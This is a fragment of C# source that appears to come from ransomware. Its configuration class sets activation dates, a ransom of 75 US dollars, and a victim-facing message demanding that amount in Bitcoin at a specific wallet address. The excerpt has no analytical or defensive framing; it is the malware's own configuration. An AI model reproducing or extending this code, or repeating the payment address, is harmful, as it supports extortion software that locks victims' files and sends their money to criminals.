...
namespace Main
{
    internal static class Config
    {
        ...
        static Config()
        {
            ...
            ActiveAfterDateTime = new DateTime(2018, 5, 10);
#else
             ...
             */
            ActiveAfterDateTime = new DateTime(2020, 5, 10); // year, month, day
#endif
            ...
            RansomUsd = 75;
            TaskMessage = @"Send this amount: $" + RansomUsd + @" worth of Bitcoin to this address: 12iQF6z9SeQeSPVvcD58EA8dXezR4DYxsJ ";
